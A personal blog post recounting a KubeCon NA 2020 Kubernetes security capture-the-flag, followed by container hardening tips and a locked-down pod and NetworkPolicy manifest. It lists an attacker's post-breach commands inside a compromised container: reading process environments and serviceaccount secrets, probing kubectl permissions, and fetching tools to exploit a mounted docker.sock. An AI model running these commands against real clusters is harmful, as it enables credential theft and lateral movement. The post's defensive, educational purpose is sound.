---
title: my capture the flag (ctf) and kubecon na 2020 experiences
date: 2020-11-30
tags: [containers, kubernetes, security]
description: let's see what I have learned during my first kubecon conference as well as my first capture the flag (ctf) experience to improve my knowledge about security with containers and kubernetes.
aliases:
    - /k8s-ctf/
---
Two weeks ago I did my first Capture The Flag (CTF) during the first time I (e-)attend a KubeCon conference.

Doing this remotely is definitely not the same feeling as I would have experienced in an in-person event. Nonetheless my KubeCon experience was awesome, I learned a lot and I really loved the energy and the momentum from the entire communities (organizers, speakers, sponsors, attendees, etc.). I felt that the focus around Kubernetes is more about how to simplify the developers versus operators experience (`buildpacks`, `kustomize`, `gitops`, `tye`, `cdk`, etc.) and to democratize security (`opa`/`gatekeeper`, `falco`, `eBPF`, etc.) around Kubernetes. If you are interested in reading great summaries from this event, I found very insightful the following resources:
- [KubeCon 2020 Highlights and Key Takeaways by StackRox](https://www.stackrox.com/post/2020/11/kubecon-2020-highlights-and-key-takeaways/)
- [KubeCon North America 2020 virtual recap by Anthony Dahanne](https://blog.dahanne.net/2020/11/18/kubecon-north-america-2020-virtual-recap/)
- [My experience at KubeCon 2020 North-America (Virtual) by Karol Deland](https://www.pragmacoders.net/my-experience-at-kubecon-2020-north-america-virtual/)
- [Different perspectives and takeaways were also discussed during the Eastern Canadian CNCF meetup December 2020](https://youtu.be/bgp6qls2bi8?t=454)

_Update on Dec 4th, 2020: [on-demand sessions are now available, enjoy! ;)](https://www.youtube.com/playlist?list=PLj6h78yzYM2Pn8RxfLh2qrXBDftr6Qjut)_

You could also watch this [KubeCon NA 2020 Wrap Up Panel](https://youtu.be/EvIjXCAfhoo) where David McKay is with his all star panel guests, they are discussing all the major news and talking about their favourite talks; giving you everything you need to know in a friendly one hour session:
{{< youtube EvIjXCAfhoo >}}

As I have been educating myself more and more about security, especially around Kubernetes, during KubeCon I mostly focused my time on sessions related to Security. Here are 2 announcements I'm really excited about:
- [Announcing the Cloud Native Security White Paper](https://www.cncf.io/blog/2020/11/18/announcing-the-cloud-native-security-white-paper/)
- [Kubernetes Security Specialist Certification Now Available](https://www.cncf.io/announcements/2020/11/17/kubernetes-security-specialist-certification-now-available/)

On Nov 20th, the last day of KubeCon NA 2020, the [SIG-Honk AMA panel: Hacking and Hardening in the Cloud Native Garden](https://kccncna20.sched.com/event/eoIZ) was really informative. This group of friends and longtime Kubernetes security SMEs brought their unique perspectives and experience with securing, attacking, and deploying cloud native infrastructure to form ”sig-HONK,” an unofficial Special Interest Group focused on changing the way we think about and practice security in distributed systems. Related topics:
- [Ian Coldwater won the Top CNCF Ambassador award](https://www.cncf.io/announcements/2020/11/20/cloud-native-computing-foundation-announces-2020-community-awards-winners/), well deserved!
- [Having Cloud Native fun with HonkCTL](https://kccncna20.sched.com/event/ekBS) - [Challenges here](https://github.com/honk-ci/honkctl)

On Nov 17th I e-attended one of the co-located (i.e. extra pre-day) events: the [Cloud Native Security Day](https://events.linuxfoundation.org/cloud-native-security-day-north-america/program/schedule/). An entire day of sessions dedicated to Security with Kubernetes, amazing! But what was even more amazing is something I discovered the same day that a Capture The Flag (CTF) was happening throughout the day!  What!? Yep! For people like me who are eager to learn by having hands-on experience, what a good fit!

> Fun, education, no ranking, fast feedback and support with a dedicated Slack channel.

> In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment. In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.

[The organizers of this CTF](https://control-plane.io/posts/hands-on-k8s-security/) did a great job and were very responsive on Slack to provide guidance and supports (yes, I needed a lot of tips, but that's ok, I went out of my comfort zone, that was the intent). All the experience started here: https://controlplaneio.github.io/kubecon-2020-sig-security-day-ctf/. From there, we went through 6 scenarios, ~1h each. With each scenario we act as an attacker already in a breached container, and from there we needed to find associated flags.

I won't go all the scenario one-by-one but instead will summarize commands an attacker will run: `id; uname -a; cat /etc/lsb-release /etc/redhat-release /etc/os-release; ps faux; df; mount; curl --version; wget --version`. From there they could see what they could do:
- which distrib is running?
- am I root?
- is there any process I could look at, like a database or anyting else sensitive `cat /proc/$PID/environ`?
- are `curl` or `wget` already installed?
- am I on a container? on kubernetes? is it a recent version of Kubernetes `curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version`?
- is the serviceaccount mounted? what is `ls /var/run/secrets/kubernetes.io/serviceaccount/` telling me? Which actions can I do `kubectl auth can-i --list`, `kubectl auth can-i create pods`?
- is the `docker.sock` mounted? can I leverage few `docker` commands to get more sensitive information or even move laterally?

More advanced scenario attackers will try, could be:
- Install `amicontained` to find out what container runtime is being used as well as features available: `cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained`
- Install `Docker` if `docker.sock` is mounted to get control on the host: `curl -fsSL https://get.docker.com -o get-docker.sh; docker ps; docker inspect; docker exec...`
- Install `kubectl` to interact with the API server: `export PATH=/tmp:$PATH; cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.19.4/bin/linux/amd64/kubectl; chmod 555 kubectl`

You could now play around on your own with these above commands with an `ubuntu` container on a given Kubernetes cluster:
```
kubectl run test -i --tty --rm --image ubuntu
```

So let's now talk about how to prevent and avoid such exploits, here are few tips we could leverage for our own security posture with our own containers running on Kubernetes:
- don't let any `curl` or `wget` components in your container if possible to prevent an attacker downloading files
- don't use privileged pod to prevent running as root and avoiding attacker installing tools in there
- don't mount the serviceaccount in your pod if you don't need it
- setup networking policies to restrict to the least minimum ingress and egress rules for your pods

Now you could deploy the same `ubuntu` container but with more security features, illustrated below, and from there, you could try again the above commands from an attacker perspective (tl,dr their live will be more complicated ;)):
```
kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test2
  labels:
    app: test2
spec:
  selector:
    matchLabels:
      app: test2
  template:
    metadata:
      labels:
        app: test2
    spec:
      serviceAccountName: default
      automountServiceAccountToken: false
      securityContext:
        runAsUser: 1000
      containers:
        - name: test2
          securityContext:
            capabilities:
              drop:
                - all
            runAsNonRoot: true
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
          image: ubuntu
          command:
            - "sleep"
            - "604800"
          ports:
            - containerPort: 80
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: denyall
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
EOF
kubectl exec -it ubuntu-xxx -- bash
```

On my end, that's kind of setup and security posture I have been taking, here are more examples I have documented about this:
- [NetworkPolicies with Calico]({{< ref "/posts/2019/09/calico.md" >}})
- [PodSecurityContext]({{< ref "/posts/2020/04/pod-security-context.md" >}})

Complementary to this, here are other security features I'm leveraging with my Kubernetes cluster to add extra security layers:
- [Binary Authorization to sign your containers]({{< ref "/posts/2020/11/binauthz.md" >}})
- [Least privilege principle and Workload Identity with my GKE cluster]({{< ref "/posts/2020/10/gke-service-account.md" >}})
- [Containers scanning in registry](https://cloud.google.com/container-analysis/docs/vulnerability-scanning)
- [Minimal and optimized OS for my nodes with COS](https://cloud.google.com/container-optimized-os/) with [`containerd`](https://cloud.google.com/kubernetes-engine/docs/concepts/using-containerd) and auto-upgrade
- Use [Confidential Computing and Shielded Nodes]({{< ref "/posts/2020/10/confidential-computing.md" >}})
- Use [Private Cluster](https://cloud.google.com/kubernetes-engine/docs/concepts/private-cluster-concept)
- I will soon add an implementation of [`OPA/GateKeeper`](https://www.openpolicyagent.org/docs/latest/kubernetes-introduction/) too.

From there I was excited to do some research around other materials I could leverage to learn more about CTF or Attacker/Defender scenario with Kubernetes, here are other interesting resources on that regard:
- [KubeCon NA 2017 - Hacking and Hardening Kubernetes Clusters by Example](https://youtu.be/vTgQLzeBfRU) - [Presentation](http://goo.gl/TNRxtd) - [Demos](http://goo.gl/fwwbgB)
- [KubeCon NA 2019 CTF - Tutorial: Attacking and Defending Kubernetes Clusters: A Guided Tour](https://youtu.be/UdMFTdeAL1s) - [Demos](https://securekubernetes.com/)
- [The Path Less Traveled: Abusing Kubernetes Defaults](https://youtu.be/HmoVSmTIOxM) - [Presentation](https://speakerdeck.com/iancoldwater/the-path-less-traveled-abusing-kubernetes-defaults)

Further and complementary resources:
- [11 Ways (Not) to Get Hacked](https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/)
- [`kubesec` by controlplane](https://kubesec.io/)
- [Cloud native security for your clusters](https://kubernetes.io/blog/2020/11/18/cloud-native-security-for-your-clusters/)
- [Hack my mis-configured Kubernetes – privileged pods](https://www.cncf.io/blog/2020/10/16/hack-my-mis-configured-kubernetes-privileged-pods/)
- [Introducing Voucher by Shopify, a service to help secure the container supply chain](https://cloud.google.com/blog/products/devops-sre/introducing-voucher-service-help-secure-container-supply-chain)
- [Best practices for building containers](https://cloud.google.com/solutions/best-practices-for-building-containers)
- [Best practices for operating containers](https://cloud.google.com/solutions/best-practices-for-operating-containers)

Security is a shared responsibility: your code, your containers and your Kubernetes clusters are not secured by default, let's democratize security since day 0 at the different levels and layers of your IT solutions!

Hope you enjoyed that one, stay safe, happy sailing and happy honking! ;)

Cheers!